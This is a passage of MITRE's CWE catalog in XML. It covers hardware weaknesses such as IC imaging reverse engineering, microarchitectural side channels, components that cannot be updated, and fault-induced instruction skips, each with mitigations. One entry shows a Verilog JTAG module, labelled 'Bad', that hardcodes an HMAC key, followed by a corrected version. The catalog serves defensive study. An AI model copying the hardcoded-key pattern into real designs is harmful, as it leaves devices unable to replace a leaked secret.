         </Related_Attack_Patterns>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
        <Note Type="Maintenance">This entry is still under development and will continue to see updates and content improvements.</Note>
      </Notes>
			<Content_History>
				<Submission>
					<Submission_Name>CWE Content Team</Submission_Name>
				<Submission_Organization>MITRE</Submission_Organization>
					<Submission_Date>2020-05-28</Submission_Date>
					<Submission_Version>4.1</Submission_Version>
					<Submission_ReleaseDate>2020-02-24</Submission_ReleaseDate>
				</Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Description, Modes_of_Introduction, Name, Potential_Mitigations, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
			<Previous_Entry_Name Date="2020-08-20">Insufficient Physical Protection Mechanism</Previous_Entry_Name>
			</Content_History>
		</Weakness>
      <Weakness ID="1278" Name="Missing Protection Against Hardware Reverse Engineering Using Integrated Circuit (IC) Imaging Techniques" Abstraction="Base" Structure="Simple" Status="Incomplete">
			<Description>Information stored in hardware may be recovered by an attacker with the capability to capture and analyze images of the integrated circuit using techniques such as scanning electron microscopy.</Description>
			<Extended_Description>
				<xhtml:p>The physical structure of a device, viewed at high enough magnification, can reveal the information stored inside. Typical steps in IC reverse engineering involve removing the chip packaging (decapsulation) then using various imaging techniques ranging from high resolution x-ray microscopy to invasive techniques involving removing IC layers and imaging each layer using a scanning electron microscope.</xhtml:p>
				<xhtml:p>The goal of such activities is to recover secret keys, unique device identifiers, and proprietary code and circuit designs embedded in hardware that the attacker has been unsuccessful at accessing through other means. These secrets may be stored in non-volatile memory or in the circuit netlist. Memory technologies such as masked ROM allow easier to extraction of secrets than One-time Programmable (OTP) memory.</xhtml:p>
			</Extended_Description>
			<Related_Weaknesses>
			  <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
			</Related_Weaknesses>
			<Applicable_Platforms>
				<Language Class="Not Language-Specific" Prevalence="Undetermined"/>
				<Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
				<Architecture Class="Not Architecture-Specific" Prevalence="Undetermined"/>
				<Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
				</Applicable_Platforms>
			<Modes_Of_Introduction>
				<Introduction>
					<Phase>Architecture and Design</Phase>
				</Introduction>
			</Modes_Of_Introduction>
			<Common_Consequences>
				<Consequence>
					<Scope>Confidentiality</Scope>
					<Impact>Varies by Context</Impact>
					<Note>A common goal of malicious actors who reverse engineer ICs is to produce and sell counterfeit versions of the IC.</Note>
				</Consequence>
			</Common_Consequences>
			<Potential_Mitigations>
				<Mitigation>
					<Phase>Architecture and Design</Phase>
					<Description>The cost of secret extraction via IC reverse engineering should outweigh the potential value of the secrets being extracted. Threat model and value of secrets should be used to choose the technology used to safeguard those secrets. Examples include IC camouflaging and obfuscation, tamper-proof packaging, active shielding, and physical tampering detection information erasure.</Description>
				</Mitigation>
			</Potential_Mitigations>
			<Demonstrative_Examples>
				<Demonstrative_Example>
					<Intro_Text>Consider an SoC design that embeds a secret key in read-only memory (ROM). The key is baked into the design logic and may not be modified after fabrication causing the key to be identical for all devices.  An attacker in possession of the IC can decapsulate and delayer the device. After imaging the layers, computer vision algorithms or manual inspection of the circuit features locate the ROM and reveal the value of the key bits as encoded in the visible circuit structure of the ROM.</Intro_Text>
				</Demonstrative_Example>
			</Demonstrative_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="188"/>
            <Related_Attack_Pattern CAPEC_ID="37"/>
            <Related_Attack_Pattern CAPEC_ID="545"/>
         </Related_Attack_Patterns>
         <References>
				<Reference External_Reference_ID="REF-1092"/>
				<Reference External_Reference_ID="REF-1129"/>
			</References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
            <Notes>
			    <Note Type="Maintenance">This entry is still under development and will continue to see updates and content improvements. It is more attack-oriented, so it might be more suited for CAPEC.</Note>
			</Notes>
			<Content_History>
				<Submission>
					<Submission_Name>Nicole Fern</Submission_Name>
					<Submission_Organization>Tortuga Logic</Submission_Organization>
					<Submission_Date>2020-05-20</Submission_Date>
					<Submission_Version>4.1</Submission_Version>
					<Submission_ReleaseDate>2020-02-24</Submission_ReleaseDate>
				</Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description, Modes_of_Introduction, Potential_Mitigations, References, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
			</Content_History>
		</Weakness>
      <Weakness ID="1303" Name="Non-Transparent Sharing of Microarchitectural Resources" Abstraction="Base" Structure="Simple" Status="Draft">
			<Description>Hardware structures shared across execution contexts (e.g., caches and branch predictors) can violate the expected architecture isolation between contexts.</Description>
			<Extended_Description>
				<xhtml:p>Modern processors use techniques such as out-of-order execution, speculation, prefetching, data forwarding, and caching to increase performance. Details about the implementation of these techniques are hidden from the programmer's view. This is problematic when the hardware implementation of these techniques results in resources being shared across supposedly isolated contexts. Contention for shared resources between different contexts opens covert channels that allow malicious programs executing in one context to recover information from another context.</xhtml:p>
				
				<xhtml:p>Some examples of shared micro-architectural resources that have been used to leak information between contexts are caches, branch prediction logic, and load or store buffers. Speculative and out-of-order execution provides an attacker with increased control over which data is leaked through the covert channel.</xhtml:p>
				
				<xhtml:p>If the extent of resource sharing between contexts in the design microarchitecture is undocumented, it is extremely difficult to ensure system assets are protected against disclosure.</xhtml:p>
			</Extended_Description>
			<Related_Weaknesses>
				<Related_Weakness Nature="ChildOf" CWE_ID="1189" View_ID="1000" Ordinal="Primary"/>
				<Related_Weakness Nature="ChildOf" CWE_ID="203" View_ID="1000"/>
			</Related_Weaknesses>
			<Applicable_Platforms>
				<Language Class="Not Language-Specific" Prevalence="Undetermined"/>
				<Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
				<Architecture Class="Not Architecture-Specific" Prevalence="Undetermined"/>
				<Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
			</Applicable_Platforms>
			<Modes_Of_Introduction>
				<Introduction>
					<Phase>Architecture and Design</Phase>
					<Note>Such issues could be introduced during hardware architecture and design and identified later during Testing or System Configuration phases.</Note>
				</Introduction>
				<Introduction>
					<Phase>Implementation</Phase>
					<Note>Such issues could be introduced during implementation and identified later during Testing or System Configuration phases.</Note>
				</Introduction>
			</Modes_Of_Introduction>
			<Common_Consequences>
				<Consequence>
					<Scope>Confidentiality</Scope>
					<Impact>Read Application Data</Impact>
					<Impact>Read Memory</Impact>
					<Note>Microarchitectural side-channels have been used to leak specific information such as cryptographic keys, and Address Space Layout Randomization (ALSR) offsets as well as arbitrary memory.</Note>
				</Consequence>
			</Common_Consequences>
			<Potential_Mitigations>
				<Mitigation>
					<Phase>Architecture and Design</Phase>
					<Description>Microarchitectural covert channels can be addressed using a mixture of hardware and software mitigation techniques. These include partitioned caches, new barrier and flush instructions, and disabling high resolution performance counters and timers.</Description>
				</Mitigation>
				<Mitigation>
					<Phase>Requirements</Phase>
					<Description>Microarchitectural covert channels can be addressed using a mixture of hardware and software mitigation techniques. These include partitioned caches, new barrier and flush instructions, and disabling high resolution performance counters and timers.</Description>
				</Mitigation>
			</Potential_Mitigations>
			<Demonstrative_Examples>
				<Demonstrative_Example>
					<Intro_Text>On some processors the hardware indirect branch predictor is shared between execution contexts, for example, between sibling SMT threads. When SMT thread A executes an indirect branch to a target address X, this target may be temporarily stored by the indirect branch predictor. A subsequent indirect branch mis-prediction for SMT thread B could speculatively execute instructions at X (or at a location in B's address space that partially aliases X). Even though the processor rolls back the architectural effects of the mis-predicted indirect branch, the memory accesses alter data cache state, which is not rolled back after the indirect branch is resolved.</Intro_Text>
				</Demonstrative_Example>
			</Demonstrative_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="663"/>
         </Related_Attack_Patterns>
         <References>
	   <Reference External_Reference_ID="REF-1121"/>
	   <Reference External_Reference_ID="REF-1122"/>
	   <Reference External_Reference_ID="REF-1123"/>
	   <Reference External_Reference_ID="REF-1124"/>
	 </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
           <Note Type="Maintenance">As of CWE 4.9, members of the CWE Hardware SIG are closely analyzing this entry and others to improve CWE's coverage of transient execution weaknesses, which include issues related to Spectre, Meltdown, and other attacks. Additional investigation may include other weaknesses related to microarchitectural state. Finally, this entry's demonstrative example might not be appropriate. As a result, this entry might change significantly in CWE 4.10.</Note>
	 </Notes>
			<Content_History>
				<Submission>
					<Submission_Name>Nicole Fern</Submission_Name>
					<Submission_Organization>Tortuga Logic</Submission_Organization>
					<Submission_Date>2020-05-08</Submission_Date>
					<Submission_Version>4.2</Submission_Version>
					<Submission_ReleaseDate>2020-08-20</Submission_ReleaseDate>
				</Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Maintenance_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
			</Content_History>
		</Weakness>
      <Weakness ID="1329" Name="Reliance on Component That is Not Updateable" Abstraction="Base" Structure="Simple" Status="Incomplete">
			<Description>The product contains a component that cannot be updated or patched in order to remove vulnerabilities or significant bugs.</Description>
			<Extended_Description>
			  <xhtml:p>
			  If the component is discovered to contain a vulnerability or critical bug, but the issue cannot be fixed using an update or patch, then the product's owner will not be able to protect against the issue.  The only option might be replacement of the product, which could be too financially or operationally expensive for the product owner.  As a result, the inability to patch or update can leave the product open to attacker exploitation or critical operation failures. This weakness can be especially difficult to manage when using ROM, firmware, or similar components that traditionally have had limited or no update capabilities.
			  </xhtml:p>
			  <xhtml:p>
			    In industries such as healthcare, "legacy"
			    devices can be operated for decades.  As a
			    US task force report [REF-1197] notes, "the inability
			    to update or replace equipment has both
			    large and small health care delivery
			    organizations struggle with numerous
			    unsupported legacy systems that cannot
			    easily be replaced (hardware, software, and
			    operating systems) with large numbers of
			    vulnerabilities and few modern
			    countermeasures."
			    </xhtml:p>
			  <xhtml:p>
			    While hardware can be prone to this weakness, software systems can also be affected, such as when a third-party driver or library is no longer actively maintained or supported but is still critical for the required functionality.</xhtml:p>
			</Extended_Description>
			<Related_Weaknesses>
			  <Related_Weakness Nature="ChildOf" CWE_ID="1357" View_ID="1000" Ordinal="Primary"/>
			  <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000"/>
			</Related_Weaknesses>
			<Weakness_Ordinalities>
			  <Weakness_Ordinality>
			    <Ordinality>Primary</Ordinality>
			  </Weakness_Ordinality>
			</Weakness_Ordinalities>
			<Applicable_Platforms>	
				<Language Class="Not Language-Specific" Prevalence="Undetermined"/>
				<Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
				<Architecture Class="Not Architecture-Specific" Prevalence="Undetermined"/>
				<Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
				<Technology Class="ICS/OT" Prevalence="Undetermined"/>
				</Applicable_Platforms>
			<Modes_Of_Introduction>
				<Introduction>
					<Phase>Requirements</Phase>
					<Note>Requirements development might not consider the importance of updates over the lifetime of the product or might intentionally exclude this capability due to concerns such as expense or speed to market.</Note>
				</Introduction>
				<Introduction>
					<Phase>Architecture and Design</Phase>
					<Note>Lack of planning during architecture development and design, or external pressures such as speed to market, could ignore the capability to update.</Note>
				</Introduction>
				<Introduction>
					<Phase>Architecture and Design</Phase>
					<Note>Designers might omit capabilities for updating a component due to time pressures to release the product or assumptions about the stability of the component.</Note>
				</Introduction>
				<Introduction>
					<Phase>Implementation</Phase>
					<Note>The weakness can appear through oversight during implementation.</Note>
				</Introduction>
			</Modes_Of_Introduction>
			<Common_Consequences>
				<Consequence>
					<Scope>Confidentiality</Scope>
					<Scope>Integrity</Scope>
					<Scope>Access Control</Scope>
					<Scope>Authentication</Scope>
					<Scope>Authorization</Scope>
					<Scope>Other</Scope>
					<Impact>Gain Privileges or Assume Identity</Impact>
					<Impact>Bypass Protection Mechanism</Impact>
					<Impact>Execute Unauthorized Code or Commands</Impact>
					<Impact>DoS: Crash, Exit, or Restart</Impact>
					<Impact>Quality Degradation</Impact>
					<Impact>Reduce Maintainability</Impact>
					<Note>If an attacker can identify an exploitable vulnerability in one product that has no means of patching, the attack may be used against all affected versions of that product.</Note>
				</Consequence>
			</Common_Consequences>
			<Detection_Methods>
			  <Detection_Method>
			    <Method>Architecture or Design Review</Method>
			    <Description>Check the consumer or maintainer documentation, the architecture/design documentation, or the original requirements to ensure that the documentation includes details for how to update the firmware.</Description>
			    <Effectiveness>Moderate</Effectiveness>
			  </Detection_Method>
			</Detection_Methods>
			<Potential_Mitigations>
				<Mitigation>
					<Phase>Requirements</Phase>
					<Description>Specify requirements that each component should be updateable, including ROM, firmware, etc.</Description>
				</Mitigation>
				<Mitigation>
					<Phase>Architecture and Design</Phase>
					<Description>Design the product to allow for updating of its components. Include the external infrastructure that might be necessary to support updates, such as distribution servers.</Description>
				</Mitigation>
				<Mitigation>
					<Phase>Architecture and Design</Phase>
					<Phase>Implementation</Phase>
					<Description>
					    With hardware, support patches that can be programmed in-field or during manufacturing through hardware fuses. This feature can be used for limited patching of devices after shipping, or for the next batch of silicon devices manufactured, without changing the full device ROM.
                    </Description>
                    <Effectiveness>Moderate</Effectiveness>
                    <Effectiveness_Notes>
                        Some parts of the hardware initialization or signature verification done to authenticate patches will always be "not patchable."  Hardware-fuse-based patches will also have limitations in terms of size and the number of patches that can be supported.
                    </Effectiveness_Notes>
				</Mitigation>
				<Mitigation>
					<Phase>Implementation</Phase>
					<Description>Implement the necessary functionality to allow each component to be updated.</Description>
				</Mitigation>
			</Potential_Mitigations>
			<Demonstrative_Examples>
				<Demonstrative_Example Demonstrative_Example_ID="DX-145">
					<Intro_Text>A refrigerator has an Internet interface for the official purpose of alerting the manufacturer when that refrigerator detects a fault. Because the device is attached to the Internet, the refrigerator is a target for hackers who may wish to use the device other potentially more nefarious purposes.</Intro_Text>
					<Example_Code Nature="Bad" Language="Other">The refrigerator has no means of patching and is hacked becoming a spewer of email spam.</Example_Code>
					<Example_Code Nature="Good" Language="Other">The device automatically patches itself and provides considerable more protection against being hacked.</Example_Code>
				</Demonstrative_Example>
				<Demonstrative_Example Demonstrative_Example_ID="DX-146">
					<Intro_Text>
						<xhtml:p>A System-on-Chip (SOC) implements a Root-of-Trust (RoT) in ROM to boot secure code. However, at times this ROM code might have security vulnerabilities and need to be patched. Since ROM is immutable, it can be impossible to patch.</xhtml:p>
					</Intro_Text>
					<Body_Text>ROM does not have built-in application-programming interfaces (APIs) to patch if the code is vulnerable. Implement mechanisms to patch the vulnerable ROM code.</Body_Text>
				</Demonstrative_Example>
				<Demonstrative_Example>
					<Intro_Text>The example code is taken from the JTAG module of the buggy OpenPiton SoC of HACK@DAC'21. JTAG is protected with a password checker. Access to JTAG operations will be denied unless the correct password is provided by the user. This user-provided password is first sent to the HMAC module where it is hashed with a secret crypto key. This user password hash (pass_hash) is then compared with the hash of the correct password (exp_hash).  If they match, JTAG will then be unlocked.</Intro_Text>
					<Example_Code Nature="Bad" Language="Verilog">
					module dmi_jtag(...)(...);<xhtml:br/>
					...<xhtml:br/>
						<xhtml:div style="margin-left:1em;">
							<xhtml:div style="margin-left:1em;">
								<xhtml:div style="margin-left:1em;">
								PassChkValid: begin<xhtml:br/>
								if(hashValid) begin<xhtml:br/>
									<xhtml:div style="margin-left:1em;">
										<xhtml:div style="margin-left:1em;">
										if(exp_hash == pass_hash) begin<xhtml:br/>
											<xhtml:div style="margin-left:1em;"> 
											pass_check = 1'b1;<xhtml:br/>
											</xhtml:div>
										end else begin<xhtml:br/>
											<xhtml:div style="margin-left:1em;">
											pass_check = 1'b0;<xhtml:br/>
											</xhtml:div>
										end<xhtml:br/>
										state_d = Idle;<xhtml:br/>
										</xhtml:div>
									end else begin<xhtml:br/>
									state_d = PassChkValid;<xhtml:br/>
									end<xhtml:br/>
									</xhtml:div>
								end<xhtml:br/>
								</xhtml:div>
							</xhtml:div>
						</xhtml:div>
					...<xhtml:br/>
						<xhtml:div style="margin-left:1em;">
						hmac hmac(<xhtml:br/>
						</xhtml:div>
					...<xhtml:br/>
						<xhtml:div style="margin-left:1em;">
							<xhtml:div style="margin-left:1em;">
							<xhtml:b>.key_i(256'h24e6fa2254c2ff632a41b...),</xhtml:b><xhtml:br/>
							</xhtml:div>
						</xhtml:div>
					...<xhtml:br/>
						<xhtml:div style="margin-left:1em;">
						);<xhtml:br/>
						</xhtml:div>
					...<xhtml:br/>
					endmodule
					</Example_Code>
					<Body_Text>However, the SoC's crypto key is hardcoded into the design and cannot be updated [REF-1387]. Therefore, if the key is leaked somehow, there is no way to reprovision the key without having the device replaced.</Body_Text>
					<Body_Text>To fix this issue, a local register should be used (hmac_key_reg) to store the crypto key. If designers need to update the key, they can upload the new key through an input port (hmac_key_i) to the local register by enabling the patching signal (hmac_patch_en) [REF-1388].</Body_Text>
					<Example_Code Nature="Good" Language="Verilog">
					module dmi_jtag(...<xhtml:br/>
					) (<xhtml:br/>
						<xhtml:div style="margin-left:1em;">
						<xhtml:b>input logic [255:0] hmac_key_i,</xhtml:b><xhtml:br/>
						<xhtml:b>input logic         hmac_patch_en,</xhtml:b><xhtml:br/>
						... <xhtml:br/>
						<xhtml:b>reg [255:0] hmac_key_reg;</xhtml:b><xhtml:br/>
						...<xhtml:br/>
						</xhtml:div>
					);<xhtml:br/>
					...<xhtml:br/>
						<xhtml:div style="margin-left:1em;">
						always_ff @(posedge tck_i or negedge trst_ni) begin<xhtml:br/>
						...<xhtml:br/>
						<xhtml:b>if (hmac_patch_en)</xhtml:b><xhtml:br/>
							<xhtml:div style="margin-left:1em;">
							<xhtml:b>hmac_key_reg &lt;= hmac_key_i;</xhtml:b><xhtml:br/>
							</xhtml:div>
						...<xhtml:br/>
						end<xhtml:br/>
						</xhtml:div>
					...<xhtml:br/>
						<xhtml:div style="margin-left:1em;">
						hmac hmac(<xhtml:br/>
						...<xhtml:br/>
						<xhtml:b>.key_i(hmac_key_reg),</xhtml:b><xhtml:br/>
						...<xhtml:br/>
						);<xhtml:br/>
						</xhtml:div>
					...<xhtml:br/>
					endmodule
					</Example_Code>
				</Demonstrative_Example>
			</Demonstrative_Examples>
			<Observed_Examples>
      			  <Observed_Example>
        		    <Reference>CVE-2020-9054</Reference>
        		    <Description>Chain: network-attached storage (NAS) device has a critical OS command injection (CWE-78) vulnerability that is actively exploited to place IoT devices into a botnet, but some products are "end-of-support" and cannot be patched (CWE-1277). [REF-1097]</Description>
        		    <Link>https://www.cve.org/CVERecord?id=CVE-2020-9054</Link>
      			  </Observed_Example>
      			</Observed_Examples>
			<References>
				<Reference External_Reference_ID="REF-1197" Section="Executive Summary"/>
				<Reference External_Reference_ID="REF-1097"/>
				<Reference External_Reference_ID="REF-1387"/>
				<Reference External_Reference_ID="REF-1388"/>
			</References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
			<Content_History>
				<Submission>
					<Submission_Name>CWE Content Team</Submission_Name>
					<Submission_Organization>MITRE</Submission_Organization>
					<Submission_Date>2020-12-03</Submission_Date>
					<Submission_Version>4.3</Submission_Version>
					<Submission_ReleaseDate>2020-12-10</Submission_ReleaseDate>
				</Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Description, Detection_Factors, Maintenance_Notes, Modes_of_Introduction, Observed_Examples, Potential_Mitigations, References, Relationships, Time_of_Introduction, Weakness_Ordinalities</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Demonstrative_Examples, References</Modification_Comment>
				</Modification>
				<Contribution Type="Content">
					<Contribution_Name>Chen Chen, Rahul Kande, Jeyavijayan Rajendran</Contribution_Name>
					<Contribution_Organization>Texas A&amp;M University</Contribution_Organization>
					<Contribution_Date>2023-06-21</Contribution_Date>
					<Contribution_Comment>suggested demonstrative example</Contribution_Comment>
				</Contribution>
				<Contribution Type="Content">
					<Contribution_Name>Shaza Zeitouni, Mohamadreza Rostami, Ahmad-Reza Sadeghi</Contribution_Name>
					<Contribution_Organization>Technical University of Darmstadt</Contribution_Organization>
					<Contribution_Date>2023-06-21</Contribution_Date>
					<Contribution_Comment>suggested demonstrative example</Contribution_Comment>
				</Contribution>
			</Content_History>
		</Weakness>
      <Weakness ID="1332" Name="Improper Handling of Faults that Lead to Instruction Skips" Abstraction="Base" Structure="Simple" Status="Stable">
            <Description>The device is missing or incorrectly implements circuitry or sensors that detect and mitigate the skipping of security-critical CPU instructions when they occur.</Description>
			<Extended_Description>
              <xhtml:p>The operating conditions of hardware may change
              in ways that cause unexpected behavior to occur,
              including the skipping of security-critical CPU
              instructions. Generally, this can occur due to
              electrical disturbances or when the device operates
              outside of its expected conditions.</xhtml:p>
			  <xhtml:p>In practice, application code may contain
			  conditional branches that are security-sensitive (e.g.,
			  accepting or rejecting a user-provided password). These
			  conditional branches are typically implemented by a
			  single conditional branch instruction in the program
			  binary which, if skipped, may lead to effectively
			  flipping the branch condition - i.e., causing the wrong
			  security-sensitive branch to be taken. This affects
			  processes such as firmware authentication, password
			  verification, and other security-sensitive decision
			  points.</xhtml:p>
			  <xhtml:p>Attackers can use fault injection techniques to
			  alter the operating conditions of hardware so that
			  security-critical instructions are skipped more
			  frequently or more reliably than they would in a
			  "natural" setting.</xhtml:p>
			</Extended_Description>
			<Related_Weaknesses>
				<Related_Weakness Nature="ChildOf" CWE_ID="1384" View_ID="1000" Ordinal="Primary"/>
				<Related_Weakness Nature="PeerOf" CWE_ID="1247" View_ID="1194" Ordinal="Primary"/>
			</Related_Weaknesses>
		 <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
		 </Weakness_Ordinalities>
			<Applicable_Platforms>
				<Language Class="Not Language-Specific" Prevalence="Undetermined"/>
				<Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
				<Architecture Class="Not Architecture-Specific" Prevalence="Undetermined"/>
                <Technology Class="System on Chip" Prevalence="Undetermined"/>
            </Applicable_Platforms>
			<Modes_Of_Introduction>
				<Introduction>
					<Phase>Architecture and Design</Phase>
                    <Note>Failure to design appropriate countermeasures to common fault injection techniques can manifest this weakness.</Note>
				</Introduction>
				<Introduction>
					<Phase>Implementation</Phase>
					<Note>This weakness can arise if the hardware design incorrectly implements countermeasures to prevent fault injection.</Note>
				</Introduction>
			</Modes_Of_Introduction>
			<Common_Consequences>
				<Consequence>
					<Scope>Confidentiality</Scope>
					<Scope>Integrity</Scope>
					<Scope>Authentication</Scope>
                    <Impact>Bypass Protection Mechanism</Impact>
                    <Impact>Alter Execution Logic</Impact>
			        <Impact>Unexpected State</Impact>
					<Likelihood>High</Likelihood>
                    <Note>Depending on the context, instruction skipping can
                        have a broad range of consequences related to the
                        generic bypassing of security critical code.</Note>
				</Consequence>
			</Common_Consequences>
			<Detection_Methods>
			  <Detection_Method>
			    <Method>Automated Static Analysis</Method>
			    <Description>This weakness can be found using automated static analysis once a developer has indicated which code paths are critical to protect.</Description>
			    <Effectiveness>Moderate</Effectiveness>
			  </Detection_Method>
			  <Detection_Method>
			    <Method>Simulation / Emulation</Method>
